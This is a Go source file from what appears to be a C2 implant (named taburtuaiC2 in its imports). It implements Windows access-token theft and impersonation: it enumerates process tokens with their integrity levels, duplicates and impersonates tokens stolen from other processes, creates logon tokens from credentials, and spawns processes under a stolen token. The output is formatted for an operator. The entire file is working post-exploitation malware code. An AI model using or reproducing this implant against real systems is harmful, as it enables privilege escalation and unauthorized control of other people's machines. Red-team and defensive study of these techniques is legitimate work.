//go:build windows

package exec

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// TokenInfo holds information about a process's token.
type TokenInfo struct {
	PID           uint32
	ProcessName   string
	Username      string
	Integrity     string
	Impersonating bool
}

// PROCESSENTRY32W mirrors the Win32 struct for process enumeration.
type PROCESSENTRY32W struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [260]uint16
}

// ListTokens enumerates running processes and their token users.
func ListTokens() ([]TokenInfo, error) {
	hSnap, _, e := winsyscall.ProcCreateToolhelp32Snapshot.Call(uintptr(winsyscall.Th32csSnapProcess), 0)
	if hSnap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %v", e)
	}
	defer windows.CloseHandle(windows.Handle(hSnap))

	var entry PROCESSENTRY32W
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	var infos []TokenInfo
	r, _, _ := winsyscall.ProcProcess32First.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
	for r != 0 {
		pid := entry.Th32ProcessID
		name := windows.UTF16ToString(entry.SzExeFile[:])
		user, integ := tokenUserIntegrity(pid)
		infos = append(infos, TokenInfo{
			PID:         pid,
			ProcessName: name,
			Username:    user,
			Integrity:   integ,
		})
		entry.DwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = winsyscall.ProcProcess32Next.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
	}
	return infos, nil
}

func tokenUserIntegrity(pid uint32) (user, integrity string) {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "", ""
	}
	defer windows.CloseHandle(hProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &hToken); err != nil {
		return "", ""
	}
	defer hToken.Close()

	u, err := hToken.GetTokenUser()
	if err == nil {
		account, domain, _, _ := u.User.Sid.LookupAccount("")
		user = domain + "\\" + account
	}

	var sz uint32
	windows.GetTokenInformation(hToken, windows.TokenIntegrityLevel, nil, 0, &sz)
	if sz > 0 {
		buf := make([]byte, sz)
		if windows.GetTokenInformation(hToken, windows.TokenIntegrityLevel,
			&buf[0], sz, &sz) == nil {
			til := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&buf[0]))
			rid := til.Label.Sid.SubAuthority(uint32(til.Label.Sid.SubAuthorityCount() - 1))
			switch {
			case rid >= 0x4000:
				integrity = "System"
			case rid >= 0x3000:
				integrity = "High"
			case rid >= 0x2000:
				integrity = "Medium"
			default:
				integrity = "Low"
			}
		}
	}
	return user, integrity
}

// ImpersonateToken steals a token from pid and impersonates it in the current thread.
func ImpersonateToken(pid uint32) (string, error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	var src windows.Token
	if err := windows.OpenProcessToken(hProc,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE, &src); err != nil {
		return "", fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer src.Close()

	var imp windows.Token
	if err := windows.DuplicateTokenEx(src,
		winsyscall.TokenAllAccess, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &imp,
	); err != nil {
		return "", fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer imp.Close()

	r, _, e := winsyscall.ProcImpersonateLoggedOnUser.Call(uintptr(imp))
	if r == 0 {
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %v", e)
	}

	user, _ := tokenUserIntegrity(pid)
	return user, nil
}

// RevertToSelf drops impersonation.
func RevertToSelf() error {
	r, _, e := winsyscall.ProcRevertToSelf.Call()
	if r == 0 {
		return fmt.Errorf("RevertToSelf: %v", e)
	}
	return nil
}

// MakeToken calls LogonUser to create a token for user:domain with password.
func MakeToken(user, domain, password string) error {
	userPtr, _ := windows.UTF16PtrFromString(user)
	domainPtr, _ := windows.UTF16PtrFromString(domain)
	passPtr, _ := windows.UTF16PtrFromString(password)

	var hToken windows.Token
	r, _, e := winsyscall.ProcLogonUser.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(winsyscall.Logon32LogonInteractive),
		uintptr(winsyscall.Logon32ProviderDefault),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return fmt.Errorf("LogonUser(%s\\%s): %v", domain, user, e)
	}
	defer hToken.Close()
	return nil
}

func stealToken(pid uint32) (windows.Token, error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	var src windows.Token
	if err := windows.OpenProcessToken(hProc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &src); err != nil {
		return 0, fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer src.Close()

	var dup windows.Token
	if err := windows.DuplicateTokenEx(src,
		winsyscall.TokenAllAccess,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dup,
	); err != nil {
		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	return dup, nil
}

func runAsToken(token windows.Token, exe, args string) error {
	exePtr, _ := windows.UTF16PtrFromString(exe)
	var cmdLine *uint16
	if args != "" {
		cmdLine, _ = windows.UTF16PtrFromString(exe + " " + args)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	r, _, e := winsyscall.ProcCreateProcessWithToken.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(exePtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %v", e)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}

// TokenListText returns a formatted string of process tokens for the operator.
func TokenListText(infos []TokenInfo) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s %-30s %-40s %-10s\n", "PID", "Process", "User", "Integrity"))
	sb.WriteString(fmt.Sprintf("%-8s %-30s %-40s %-10s\n", "---", "-------", "----", "---------"))
	for _, t := range infos {
		if t.Username == "" {
			continue
		}
		sb.WriteString(fmt.Sprintf("%-8d %-30s %-40s %-10s\n",
			t.PID, t.ProcessName, t.Username, t.Integrity))
	}
	return sb.String()
}
